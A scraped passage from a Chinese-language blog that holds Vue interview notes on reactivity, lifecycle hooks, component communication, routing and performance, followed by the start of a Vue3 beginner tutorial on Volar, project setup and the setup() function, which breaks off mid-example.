數組則通過重寫數組方法來實現的。擴展它的 7 個變更⽅法，通過監聽這些方法可以做到依賴收集和派發更新 內部依賴收集是怎麼做到的？每個屬性都擁有自己的dep屬性，存放他所依賴的 watcher，當屬性變化後會通知自己對應的 watcher去更新 響應式流程：\ndefineReactive 把數據定義成響應式的 給屬性增加一個 dep，用來收集對應的那些watcher 等數據變化進行更新\ndep.depend() // get 取值：進行依賴收集\ndep.notify() // set 設置時：通知視圖更新 對象層級過深，性能就會差 不需要響應數據的內容不要放在data中 object.freeze() 可以凍結數據 5. Vue如何檢測數組變化？ 數組考慮性能原因沒有用defineProperty對數組的每一項進行攔截，而是選擇重寫數組 方法以進行重寫。當數組調用到這 7 個方法的時候，執行 ob.dep.notify() 進行派發通知 Watcher 更新 在Vue中修改數組的索引和長度是無法監控到的。需要通過以下7種變異方法修改數組才會觸發數組對應的wacther進行更新。數組中如果是對像數據類型也會進行遞歸劫持 那如果想要改索引更新數據怎麼辦？\n可以通過Vue.set()來進行處理 ➞ 核心內部用的是 splice 方法 1 2 3 4 5 6 7 8 9 // 取出原型方法； const arrayProto = Array.prototype // 拷貝原型方法； export const arrayMethods = Object.create(arrayProto) // 重寫數組方法； def(arrayMethods, method, function mutator (…args) { } ob.dep.notify() // 調用方法時更新視圖 6. Vue.set 方法是如何實現的？ 為什麼$set可以觸發更新，我們給對象和數組本身都增加了dep屬性，當給對像新增不存在的屬性則觸發對象依賴的watcher去更新，當修改數組索引時我們調用數組本身的splice方法去更新數組 官方定義 Vue.set(object, key, value)\n7. Vue中模板編譯原理？ 如何將template轉換成render函數(這裡要注意的是我們在開發時盡量不要使用template，因為將template轉化成render方法需要在運行時進行編譯操作會有性能損耗，同時引用帶有complier包的vue體積也會變大) 默認.vue文件中的 template處理是通過vue-loader 來進行處理的並不是通過運行時的編譯 將 template 模板轉換成 ast 語法樹 - parserHTML 對靜態語法做靜態標記 - markUp 重新生成代碼 - codeGen 模板引擎的實現原理就是new Function + with來進行實現的\nvue-loader中处理template属性主要靠的是 vue-template-compiler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // vue-loader // template =\u0026gt; ast =\u0026gt; codegen =\u0026gt; with+function 實現生成render方法 let {ast, render } = VueTemplateCompiler.compile(\u0026lt;div\u0026gt;{{aaa}}\u0026lt;/div\u0026gt;) console.log(ast, render) // 模板引擎的實現原理 with + new Function console.log(new Function(render).tostring()) // render方法執行完畢後生成的是虛擬 dom // with(this){return _c(‘div’,[_s(aaa)])} // 代碼生成 const ast = parse(template.trim(), options) // 將代碼解析成ast語法樹 if (options.optimize !== false) { optimize(ast, options) // 優化代碼 標記靜態點 標記樹 } const code = generate(ast, options) // 生成代碼 8. Proxy 與 Object.defineProperty 優劣對比 Proxy 的優勢如下 Proxy 可以直接監聽對象而非屬性 Proxy 可以直接監聽數組的變化 Proxy 有多達 13 種攔截方法,不限於 apply、ownKeys、deleteProperty、has 等等是 Object.defineProperty 不具備的 Proxy 返回的是一個新對象,我們可以只操作新的對象達到目的,而 Object.defineProperty 只能遍歷對象屬性直接修改 Proxy 作為新標準將受到瀏覽器廠商重點持續的性能優化，也就是傳說中的新標準的性能紅利 Object.defineProperty 的優勢如下 兼容性好，支持 IE9，而 Proxy 的存在瀏覽器兼容性問題，而且無法用 polyfill 磨平，因此 Vue 的作者才聲明需要等到下個大版本( 3.0 )才能用 Proxy 重寫 9. Vue3.x響應式數據原理 Vue3.x改用Proxy替代Object.defineProperty。因為Proxy可以直接監聽對象和數組的變化，並且有多達13種攔截方法。並且作為新標準將受到瀏覽器廠商重點持續的性能優化 Proxy只會代理對象的第一層，那麼Vue3又是怎樣處理這個問題的呢？\n判斷當前Reflect.get的返回值是否為Object，如果是則再通過reactive方法做代理， 這樣就實現了深度觀測 監測數組的時候可能觸發多次get/set，那麼如何防止觸發多次呢？\n我們可以判斷key是否為當前被代理對象target自身屬性，也可以判斷舊值與新值是否相等，只有滿足以上兩個條件之一時，才有可能執行trigger 生命周期篇 Vue的生命週期方法有哪些？一般在哪一步發起請求及原因 總共分為8個階段：創建前/後，載入前/後，更新前/後，銷毀前/後 創建前/後：\nbeforeCreate階段：vue實例的掛載元素el和數據對象data都為undefined，還未初始化。\n說明：在當前階段data、methods、computed以及watch上的數據和方法都不能被訪問。\ncreated階段：vue實例的數據對象data有了，el還沒有。\n說明：可以做一些初始數據的獲取，在當前階段無法與Dom進行交互，如果非要想，可以通過vm.$nextTick來訪問Dom。\n載入前/後：\nbeforeMount階段：vue實例的$el和data都初始化了，但還是掛載之前為虛擬的dom節點。\n說明：當前階段虛擬Dom已經創建完成，即將開始渲染。在此時也可以對數據進行更改，不會觸發updated。\nmounted階段：vue實例掛載完成，data.message成功渲染。\n說明：在當前階段，真實的Dom掛載完畢，數據完成雙向綁定，可以訪問到Dom節點，使用$refs屬性對Dom進行操作。\n更新前/後：\nbeforeUpdate階段：響應式數據更新時調用，發生在虛擬DOM打補丁之前，適合在更新之前訪問現有的DOM，比如手動移除已添加的事件監聽器。\n說明：可以在當前階段進行更改數據，不會造成重渲染。\nupdated階段：虛擬DOM重新渲染和打補丁之後調用，組成新的DOM已經更新，避免在這個鉤子函數中操作數據，防止死循環。\n說明：當前階段組件Dom已完成更新。要注意的是避免在此期間更改數據，因為這可能會導致無限循環的更新。\n銷毀前/後：\nbeforeDestroy階段：實例銷毀前調用，實例還可以用，this能獲取到實例，常用於銷毀定時器，解綁事件。\n說明：在當前階段實例完全可以被使用，我們可以在這時進行善後收尾工作，比如清除計時器。\ndestroyed階段：實例銷毀後調用，調用後所有事件監聽器會被移除，所有的子實例都會被銷毀。\n說明：當前階段組件已被拆解，數據綁定被卸除，監聽被移出，子實例也統統被銷毀。\n補充：\n第一次頁面加載時會觸發：beforeCreate, created, beforeMount, mounted。\ncreated 實例已經創建完成，因為它是最早觸發的原因可以進行一些數據，資源的請求。 (服務器渲染支持created方法) mounted 實例已經掛載完成，可以進行一些DOM操作。 (接口請求) 生命週期鉤子是如何實現的？ Vue的生命週期鉤子就是回調函數而已，當創建組件實例的過程中會調用對應的鉤子方法。 補充：\n內部主要是使用callHook方法來調用對應的方法。核心是一個發布訂閱模式，將鉤子訂閱好(內部採用數組的方式存儲)，在對應的階段進行發布。\nVue 的父組件和子組件生命週期鉤子執行順序 第一次頁面加載時會觸發 beforeCreate, created, beforeMount, mounted 這幾個鉤子。 渲染過程： 父組件掛載完成一定是等子組件都掛載完成後，才算是父組件掛載完，所以父組件的mounted在子組件mouted之後\n父beforeCreate ➡ 父created ➡ 父beforeMount ➡ 子beforeCreate ➡ 子created ➡ 子beforeMount ➡ 子mounted ➡ 父mounted\n子組件更新過程： 影響到父組件：父beforeUpdate -\u0026gt; 子beforeUpdate-\u0026gt;子updated -\u0026gt; 父updted\n不影響父組件：子beforeUpdate -\u0026gt; 子updated\n父組件更新過程： 影響到子組件：父beforeUpdate -\u0026gt; 子beforeUpdate-\u0026gt;子updated -\u0026gt; 父updted\n不影響子組件：父beforeUpdate -\u0026gt; 父updated\n銷毀過程： 父beforeDestroy -\u0026gt; 子beforeDestroy -\u0026gt; 子destroyed -\u0026gt; 父destroyed\n重要：父組件等待子組件完成後，才會執行自己對應完成的鉤子。\n組件通信篇 Vue中的組件的data 為什麼是一個函數？ 每次使用組件時都會對組件進行實例化操作，並且調用data函數返回一個對像作為組件的數據源。這樣可以保證多個組件間數據互不影響。 如果data是對象的話，對象屬於引用類型，會影響到所有的實例。所以為了保證組件不同的實例之間data不衝突，data必須是一個函數。 Vue 組件間通信有哪幾種方式？ Vue 組件間通信只要指以下 3 類通信：父子組件通信、隔代組件通信、兄弟組件通信，下面我們分別介紹每種通信方式且會說明此種方法可適用於哪類組件間通信。 props / $emit 適用父子組件通信\n這種方法是 Vue 組件的基礎，相信大部分同學耳聞能詳，所以此處就不舉例展開介紹。 ref 與 $parent / children适用父子组件通信\nref：如果在普通的DOM元素上使用，引用指向的就是DOM元素；如果用在子組件上，引用就指向組件實例 parent / $children：訪問父 / 子實例 EventBus （$emit / $on） 適用於 父子、隔代、兄弟組件通信\n這種方法通過一個空的 Vue 實例作為中央事件總線（事件中心），用它來觸發事件和監聽事件，從而實現任何組件間的通信，包括父子、隔代、兄弟組件。 attrs / listeners 適用於隔代組件通信\nattrs：包含了父作用域中不被prop所識別(且獲取)的特性綁定(class和style除外)。當一個組件沒有聲明任何prop時，這裡會包含所有父作用域的綁定(class和style除外)，並且可以通過v−bind=\u0026ldquo;attrs\u0026rdquo; 傳入內部組件。通常配合 inheritAttrs 選項一起使用。 listeners：包含了父作用域中的(不含.native修飾器的) v-on事件監聽器。它可以通過v−on=\u0026ldquo;listeners\u0026rdquo; 傳入內部組件 provide / inject 適用於隔代組件通信\n祖先組件中通過 provider 來提供變量，然後在子孫組件中通過 inject 來注入變量。 provide / inject API 主要解決了跨級組件間的通信問題，不過它的使用場景，主要是子組件獲取上級組件的狀態，跨級組件間建立了一種主動提供與依賴注入的關係。 Vuex 適用於 父子、隔代、兄弟組件通信\nVuex 是一個專為 Vue.js 應用程序開發的狀態管理模式。每一個 Vuex 應用的核心就是 store（倉庫）。 \u0026ldquo;store\u0026rdquo; 基本上就是一個容器，它包含著你的應用中大部分的狀態 (state)。 組件中寫 name選項有哪些好處及作用？ 可以通過名字找到對應的組件（遞歸組件） 可以通過name屬性實現緩存功能 (keep-alive) 可以通過name來識別組件（跨級組件通信時非常重要） 1 2 3 4 5 Vue.extend = function () { if(name) { Sub.options.componentd[name] = Sub } } keep-alive平時在哪裡使用？原理是？ keep-alive 主要是組件緩存，採用的是LRU算法。最近最久未使用法。 常用的兩個屬性include/exclude，允許組件有條件的進行緩存。 兩個生命週期activated/deactivated，用來得知當前組件是否處於活躍狀態。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 abstract: true, // 抽象組件 props:{ include: patternTypes, // 要緩存的有哪些 exclude: patternTypes, // 要排除的有哪些 max: [String, Number] //最大緩存數量 } if(cache[key]) { // 通過key 找到緩存，獲取實例 vnode.componentInstance = cache[key].componentInstance remove(keys, key) //將key刪除掉 keys.push(key) // 放到末尾 } else { cache[key] = vnode // 沒有緩存過 keys.push(key) //存儲key if(this.max \u0026amp;\u0026amp; keys.length \u0026gt; parseInt(this.max)) { // 如果超過最大緩存數 // 刪除最早緩存的 pruneCacheEntry(cache, keys[0], keys, this._vnode) } } vnode.data.keepAlive = true // 標記走了緩存 Vue.minxin的使用場景和原理？ Vue.mixin的作用就是抽離公共的業務邏輯，原理類似\u0026quot;對象的繼承\u0026quot;，當組件初始化時會調用 mergeOptions方法進行合併，採用策略模式針對不同的屬性進行合併，如果混入的數據和本身組件中的數據衝突，會採用\u0026quot;就近原則\u0026quot;以組件的數據為準。 補充：\nmixin中有很多缺陷\u0026quot;命名衝突問題\u0026quot;、\u0026ldquo;依賴問題\u0026rdquo;、\u0026ldquo;數據來源問題\u0026rdquo;，這裡強調一下mixin的數據是不會被共享的。\n路由篇 Vue-router有幾種鉤子函數？具體是什麼及執行流程是怎樣的？ 路由鉤子的執行流程，鉤子函數種類有：全局守衛、路由守衛、組件守衛。 完整的導航解析流程 導航被觸發 在失活的組件裡調用beforeRouteLeave守衛 調用全局beforeEach守衛 在復用組件裡調用beforeRouteUpdate守衛 調用路由配置裡的beforeEnter守衛 解析異步路由組件 在被激活的組件裡調用beforeRouteEnter守衛 調用全局beforeResolve守衛 導航被確認 調用全局的afterEach鉤子 DOM更新 用創建好的實例調用beforeRouteEnter守衛中傳給next的回調函數 vue-router 兩種模式的區別？ vue-router 有 3 種路由模式：hash、history、abstract。 hash模式：hash + hashChange\n特點：hash雖然在URL中，但不被包括在HTTP請求中；用來指導瀏覽器動作，對服務端安全無用，hash不會重加載頁面。通過監聽 hash（#）的變化來執行js代碼 從而實現 頁面的改變。\n核心代码：\n1 2 3 window.addEventListener(‘hashchange‘,function(){ self.urlChange() }) history模式：historyApi + popState\nHTML5推出的history API，由pushState()記錄操作歷史，監聽popstate事件來監聽到狀態變更。\n因為只要刷新這個url(www.ff.ff/jjkj/fdfd/fdf/fd)就會請求服務器，然而服務器上根本沒有這個資源，所以就會報404，解決方案就配置一下服務器端。\n說明：\n1. hash: 使用 URL hash 值來作路由。支持所有瀏覽器，包括不支持 HTML5 History Api 的瀏覽器\n2. history : 依賴 HTML5 History API 和服務器配置。具體可以查看 HTML5 History 模式\n3. abstract : 支持所有 JavaScript 運行環境，如 Node.js 服務器端。如果發現沒有瀏覽器的 API，路由會自動強制進入這個模式\n屬性作用與對比篇 nextTick在哪裡使用？原理是？ nextTick的回調是在下次DOM更新循環結束之後執行的延遲回調。在修改數據之後立即使用這個方法，獲取更新後的DOM。 nextTick主要使用了宏任務和微任務。原理就是異步方法(promise, mutationObserver, setImmediate, setTimeout)經常與事件循環一起來問。 補充：\nvue多次更新數據，最終會進行批處理更新。內部調用的就是nextTick實現了延遲更新，用戶自定義的nextTick中的回調會被延遲到更新完成後調用，從而可以獲取更新後的DOM。\nVue 為什麼需要虛擬DOM？虛擬DOM的優劣如何？ Virtual DOM 就是用js對象來描述真實DOM，是對真實DOM的抽象，由於直接操作DOM性能低但是js層的操作效率高，可以將DOM操作轉化成對像操作，最終通過diff算法比對差異進行更新DOM(減少了對真實DOM的操作)。虛擬DOM不依賴真實平台環境從而也可以實現跨平台。 補充：\n虛擬DOM的實現就是普通對象包含tag、data、children等屬性對真實節點的描述。(本質上就是在JS和DOM之間的一個緩存)\nVue2的 Virtual DOM 借鑒了開源庫snabbdom的實現。\nVirtualDOM映射到真實DOM要經歷VNode的create、diff、patch等階段。\nVue中key的作用和工作原理，說說你對它的理解 例如： 1 v-for=\u0026#34;(item, itemIndex) in tabs\u0026#34; :key=\u0026#34;itemIndex\u0026#34; key的作用主要是為了高效的更新虛擬DOM，其原理是vue在patch過程中通過key可以精準判斷兩個節點是否是同一個，從而避免頻繁更新不同元素，使得整個patch過程更加高效，減少DOM操作量，提高性能。 補充：\n若不設置key還可能在列表更新時引發一些隱蔽的bug vue中在使用相同標籤名元素的過渡切換時，也會使用到key屬性，其目的也是為了讓vue可以區分它們，否則vue只會替換其內部屬性而不會觸發過渡效果 Vue 中的diff原理 vue的diff算法是平級比較，不考慮跨級比較的情況。內部採用深度遞歸的方式 + 雙指針的方式進行比較。 補充：\n先比較是否是相同節點 相同節點比較屬性，並複用老節點 比較兒子節點，考慮老節點和新節點兒子的情況 優化比較：頭頭、尾尾、頭尾、尾頭 比對查找進行複用 Vue2 與 Vue3.x 的diff算法： Vue2的核心Diff算法採用了雙端比較的算法，同時從新舊children的兩端開始進行比較，借助key值找到可複用的節點，再進行相關操作。 Vue3.x借鑒了ivi算法和 inferno算法，該算法中還運用了動態規劃的思想求解最長遞歸子序列。 (實際的實現可以結合Vue3.x源碼看。) v-if 與 v-for的優先級 v-for優先於v-if被解析 如果同時出現，每次渲染都會先執行循環再判斷條件，無論如何循環都不可避免，浪費了性能 要避免出現這種情況，則在外層嵌套template，在這一層進行v-if判斷，然後在內部進行v-for循環 如果條件出現在循環內部，可通過計算屬性提前過濾掉那些不需要顯示的項 v-if與v-show的區別 v-if 是真正的條件渲染，直到條件第一次變為真時，才會開始渲染。 v-show 不管初始條件是什麼會渲染，並且只是簡單地基於 CSS 的 “display” 屬性進行切換。 注意：v-if 適用於不需要頻繁切換條件的場景；v-show 則適用於需要非常頻繁切換條件的場景。\ncomputed 和 watch 的區別和運用的場景？ computed： 計算屬性。依賴其它屬性值，並且 computed 的值有緩存，只有它依賴的屬性值發生改變，下一次獲取 computed 的值時才會重新計算 computed 的值 watch： 監聽數據的變化。更多的是「觀察」的作用，類似於某些數據的監聽回調 ，每當監聽的數據變化時都會執行回調進行後續操作 運用場景： 當我們需要進行數值計算，並且依賴於其它數據時，應該使用 computed，因為可以利用 computed 的緩存特性，避免每次獲取值時，都要重新計算。 當我們需要在數據變化時執行異步或開銷較大的操作時，應該使用 watch，使用 watch 選項允許我們執行異步操作 ( 訪問一個 API )，限制我們執行該操作的頻率，並在我們得到最終結果前，設置中間狀態。這些都是計算屬性無法做到的。 如何理解自定義指令？ 指令的實現原理，可以從編譯原理 ➡ 代碼生成 ➡ 指令鉤子實現進行概述 在生成 ast 語法樹時，遇到指令會給當前元素添加directives屬性 通過 genDirectives 生成指令代碼 在patch前將指令的鉤子提取到 cbs中，在patch過程中調用對應的鉤子 當執行指令對應鉤子函數時，調用對應指令定義的方法 v-model的原理是什麼？ v-model本質就是一個語法糖，可以看成是value + input方法的語法糖。可以通過model屬性的prop和event屬性來進行自定義。原生的v-model，會根據標籤的不同生成不同的事件和屬性。 v-model 在內部為不同的輸入元素使用不同的屬性並拋出不同的事件： text 和 textarea 元素使用 value 屬性和 input 事件。 checkbox 和 radio 使用 checked 屬性和 change 事件。 select 字段將 value 作為 prop 並將 change 作為事件。 性能優化篇 Vue性能優化 - 編碼階段 盡量減少data中的數據，data中的數據都會增加getter和setter，會收集對應的watcher 如果需要使用v-for給每項元素綁定事件時使用事件代理 SPA 頁面採用keep-alive緩存組件 在更多的情況下，使用v-if替代v-show key保證唯一 使用路由懶加載、異步組件 防抖、節流 第三方模塊按需導入 長列表滾動到可視區域動態加載 圖片懶加載 Vue性能優化 - 用戶體驗 骨架屏 PWA 使用緩存(客戶端緩存、服務端緩存)優化、服務端開啟gzip壓縮等 Vue性能優化 - SEO優化 預渲染 服務端渲染SSR Vue性能優化 - 打包優化 壓縮代碼 Tree Shaking/Scope Hoisting 使用cdn加載第三方模塊 多線程打包happypack splitChunks抽離公共文件 sourceMap優化 ","date":"2022-08-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52282698225_df2b066743_o.jpg","permalink":"https://wayneblog.ga/2022-08-12/vue-interview-note/","title":"Vue 基本概念與常見面試題筆記"},{"content":" 本文適合 Vue3 初學者，或者 Vue2 遷移者，當然還是建議 Vue3 官網完全過一遍。\n先推薦兩個 vscode 外掛 Volar 首先推薦 Volar ，使用 vscode 開發 Vue 專案的小夥伴肯定都認識 Vetur 這個神級外掛，有了它可以讓我們得開發如魚得水。 那麼 Volar 可以理解為 Vue3 版本的 Vetur ，程式碼高亮，語法提示，基本上 Vetur 有的它都有。\n功能一：多個根節點編譯器不會報錯 Vue3 是允許我們有多個根節點的，但是我們如果使用 Vetur 就會報錯，不會影響執行，但是看起來就很煩。所以當我們轉向 Volar，那麼就不會出現這個問題了。\n功能二：編輯器分隔 即便 Vue 的元件化開發，可以將單檔案的程式碼長度大幅縮短，但還是動輒幾百行甚是上千行。那麼我們切換 template、script、style 的時候就要頻繁上下翻，雖然有的外掛可以直接定位到 css，但是你回不去啊！所以這個功能簡直是太人性化了。\n安裝完 Volar 以後，開啟一個 .vue 檔案，看 vscode 的右上角，有這麼一個圖示，點一下。\n它就會自動給你分隔成三個頁面，分別對應 template、script、style，這樣就太舒服了有沒有。\n還有很多新功能，可以參考下面這篇文章：\nVolar - vue終極開發神器！\n功能三：ref sugar 語法快捷改動支持 ref sugar 是一個還在 rfc 階段的功能，但是已經持續很久了，現在的 vue3 版本已經可以嚐鮮使用了。具體的用法以及語法我就不展開贅述了，我主要說一下 Volar 和 ref sugar 的結合。\n報錯先不管，是 eslint-plugin-vue 的原因。\n可以看到，在使用了 ref sugar 之後，script 上面出現了一個 ref sugar 的小圖標，並且打了個對勾，那麼我們點一下那個對勾，看看會發生什麼。\n可以看到，我們點擊這個小對勾之後，它由原本的 ref sugar 語法變為了普通的 script setup 模式，驚不驚喜，意不意外。\n功能四：style 裡面的 class 引用 可以看到，在 .foo 這個類名上面，出現了一個 1 reference 的小圖標，代表著當前 class 有一次引用，我們點擊一下這個 1 reference。\n出現了一個彈窗，裡面是當前 class 的具體使用位置。\n功能五：class 追朔 我們創建一個 template 根元素，在裡面寫入：\nsample.vue 1 2 3 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在 style 中寫入：\nsample.vue 1 2 3 \u0026lt;style scoped\u0026gt; .foo {} \u0026lt;/style\u0026gt; 除了 style 中的 .foo 上面會出現 1 reference 的小圖標之外，在 class=\u0026quot;foo\u0026quot; 的 foo 下面，會出現一道橫線。\n對於經常使用 vscode 的開發人員來說，這代表什麼意義就不必多說了，我們根據提示，按住 ctrl(command) 然後點擊，會發現光標自己移動到了 style 中的 .foo 之前，哇! awesome!\n功能六：css module 類型提示 css module 一般是 react 技術棧用的會比較多一些，就我個人來說，是從沒在 vue 裡面使用它的，因為 vue 提供了 scoped 作用域，不用擔心樣式衝突，直接使用預處理器會更加簡單方便。\n我們創建如下代碼：\nsample.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div :class=\u0026#34;$style.foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style module\u0026gt; .foo { } \u0026lt;/style\u0026gt; 然後將鼠標移動到 $style 上\n有點意思，看來 vscode 是讓 Volar 玩明白了。\n功能七：lang 語法提示 vue 可以使用 lang 屬性來選擇使用的語言，比如 template 中的 html/pug、script 中的 ts、style 中的 scss 等。\n但是在以前，我們都是手動輸入的，編輯器，或者說 Vetur 並沒有給我們提供任何提示，有可能你找了很久的莫名其妙的問題，就是因為 lang 寫錯了。\n但是這一切，在有了 Volar 之後，都不同了。\n功能八：template 語法轉換 vue 默認提供了兩種模板供我們使用，但是一般都會使用 html，另外一種叫做 pug。\n相對於 html，pug 更偏向於 yml 那種，簡潔程度特別高。\n在 Volar 中，為我們提供了 html 和 pug 互相轉換的功能。\nsample.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;img /\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在我們書寫 template 之後，template 頂部會出現一個小小的 pug 圖標，我們可以看到此時它是沒有被選中的。\n這個時候我們點擊一下這個圖標，讓它選中，神奇的事情發生了。\n我們寫好的 html 模板，被自動轉化成了 pug，再點擊一下，又回到了我們熟悉的 html。\n從功能三開始，基本都是算內測的新功能，我是機緣巧合之下，將 Volar 下到本地進行查看的時候發現的這些。想嚐鮮的可以自己下載源碼，然後在packages/vscode-vue-languageservice/testCases目錄下體驗，希望這些功能可以盡快發布！\nVue 3 Snippets 推薦的第二個外掛叫做 Vue 3 Snippets ，同樣的，他也有自己的 Vue2 版本。它是幹什麼的呢，可以看一下下面這張圖，我只輸入了 \u0026quot;v3\u0026quot; ，它有很多提示，我們就先選擇 v3computed ，選中 Enter 即可。\n然後它就給我們自動寫了如下程式碼：\n是不是超級省事，摸魚的時間又增加了！還有更多有趣的使用方式，小夥伴們自行探索吧。\n建立 Vue3 專案 那麼正式開始學習我們的 Vue3 ，先從建立專案開始。\n使用 vue-cli 建立 輸入下面的命令然後選擇配置項進行安裝即可，這裡注意 vue-cli 的版本一定要在 ==4.5.0== 以上。\n1 2 3 4 5 6 7 8 ### 安裝或者升級 npm install -g @vue/cli ### 檢視版本 保證 vue cli 版本在 4.5.0 以上 vue --version ### 建立專案 vue create my-project ### 然後根據提示一步一步傻瓜式操作就行了 ### ... 使用 Vite 建立 都說 Vue3.0 和 Vite2 更配，各種優化各種快，但都不屬於本文的內容，本文的目的我們只需要知道它特別好用、怎麼用就行了。我這裡是多選擇了 TS，每行都有註釋，一目瞭然。\n1 2 3 4 5 6 7 8 ### 初始化 viete 專案 npm init vite-app \u0026lt;project-name\u0026gt; ### 進入專案資料夾 cd \u0026lt;project-name\u0026gt; ### 安裝依賴 npm install ### 啟動專案 npm run dev 建立完以後我們先來看看入口檔案 main.ts\nmain.ts 1 2 3 4 5 6 // 引入 createApp 函式，建立對應的應用，產生應用的例項物件 import { createApp } from \u0026#39;vue\u0026#39;; // 引入 app 元件 (所有元件的父級元件) import App from \u0026#39;./App.vue\u0026#39;; // 建立 app 應用返回對應的例項物件，呼叫 mount 方法進行掛載，掛載到 #app 節點上去 createApp(App).mount(\u0026#39;#app\u0026#39;); 然後看看根元件 app.vue\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- Vue2 元件中的 html 模板中必須要有一對根標籤，Vue3 元件的 html 模板中可以沒有根標籤 --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;img alt=\u0026#34;Vue logo\u0026#34; src=\u0026#34;./assets/logo.png\u0026#34;\u0026gt; \u0026lt;!-- 使用子級元件 --\u0026gt; \u0026lt;HelloWorld msg=\u0026#34;Welcome to Your Vue.js + TypeScript App\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; // 這裡可以書寫 TS 程式碼 // defineComponent 函式，目的是定義一個元件，內部可以傳入一個配置物件 import { defineComponent } from \u0026#39;vue\u0026#39;; // 引入子級元件 import HelloWorld from \u0026#39;./components/HelloWorld.vue\u0026#39;; // 暴露出去一個定義好的元件 export default defineComponent({ // 當前元件的名字 name: \u0026#39;App\u0026#39;, // 註冊元件 components: { // 註冊一個子級元件 HelloWorld, }, }); \u0026lt;/script\u0026gt; Composition API 接下來到了重頭戲，Vue3 的招牌特性，Composition API。\n關於 Composition API 這裡有圖解演示，極力推薦。\n圖解 Option API vs Composition API\nComposition API 可以更方便的抽取共通邏輯，但是不要過於在意邏輯程式碼複用，以功能提取程式碼也是一種思路。 順便提一句，Vue3 相容大部分 Vue2 語法，所以在 Vue3 中書寫 Vue2 語法是沒有問題的（廢除的除外），但是既然我們已經升級 Vue3 了，不建議混合使用，除非一些大型特殊專案需要相容兩個版本。\n生命週期鉤子 setup setup 是組合 Composition API 中的入口函式，也是第一個要使用的函式。 setup 只在初始化時執行一次，所有的 Composition API 函式都在此使用。 1 2 3 setup() { console.log(\u0026#39;我執行了\u0026#39;) // 我執行了 }, 可以通過 console.log 看到 setup 是在 beforeCreate 生命週期之前執行的(只執行一次)：\n1 2 3 4 5 6 7 8 9 beforeCreate() { console.log(\u0026#39;beforeCreate執行了\u0026#39;); }, setup() { console.log(\u0026#39;setup執行了\u0026#39;); return {}; }, // setup執行了 // beforeCreate執行了 由此可以推斷出 setup 執行的時候，元件物件還沒有建立，元件實例物件 this 還不可用，此時 this 是 undefined，不能通過 this 來訪問 data、computed、methods、props。 返回物件中的^1.^屬性會與 data 函式返回物件的屬性合併成為元件物件的屬性；^2.^返回物件中的方法會與 methods 中的方法合併成功元件物件的方法。 如果有重名，setup 優先。因為在 setup 中 this 不可用，methods 中可以訪問 setup 提供的屬性和方法，但在 setup 方法中不能訪問 data 和 methods 裡的內容，所以還是不建議混合使用。 setup 函式如果返回物件，物件中的屬性或方法，template 中可以直接使用。 sample.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{number}}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const number = 18; return { number, }; }, // ... \u0026lt;/script\u0026gt; 注意：setup 不能是一個 async 函式，因為返回值不再是 return 的物件，而是 promise，template 中就不可以使用 return 中返回物件的資料了。\nsetup 的參數(^1.^props, ^2.^context)：\nprops：是一個物件，裡面有父級元件向子級元件傳遞的資料，並且是在子級元件中使用 props 接收到的所有的屬性。 context：上下文物件，可以通過 es6 語法解構 setup(props, {^(a).^attrs, ^(b).^slots, ^(c).^emit})\n\u0026gt; a). attrs：獲取當前元件標籤上所有沒有通過 props 接收的屬性的物件，相當於 this.$attrs。\n\u0026gt; b). slots：包含所有傳入的插槽內容的物件，相當於 this.$slots。\n\u0026gt; c). emit：用來分發自定義事件的函式，相當於 this.$emit。 演示 attrs 和 props： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;child :msg=\u0026#34;msg\u0026#34; msg2=\u0026#39;哈哈哈\u0026#39; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, ref } from \u0026#39;vue\u0026#39;; // 引入子元件 import Child from \u0026#39;./components/Child.vue\u0026#39;; export default defineComponent({ name: \u0026#39;App\u0026#39;, components: { Child, }, setup() { const msg = ref(\u0026#39;hello,vue3\u0026#39;); return { msg, }; }, }); \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;子元件\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;msg:{{ msg }}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, props: [\u0026#39;msg\u0026#39;], setup(props, {attrs, slots, emit}) { console.log(\u0026#39;props:\u0026#39;, props); // msg: \u0026#34;hello,vue3\u0026#34; console.log(\u0026#39;attrs:\u0026#39;, attrs); // msg2: \u0026#34;哈哈哈\u0026#34; return {}; }, }); \u0026lt;/script\u0026gt; 演示 emit： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;child @click=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; setup() { const show = () =\u0026gt; { console.log(\u0026#39;name:\u0026#39;, 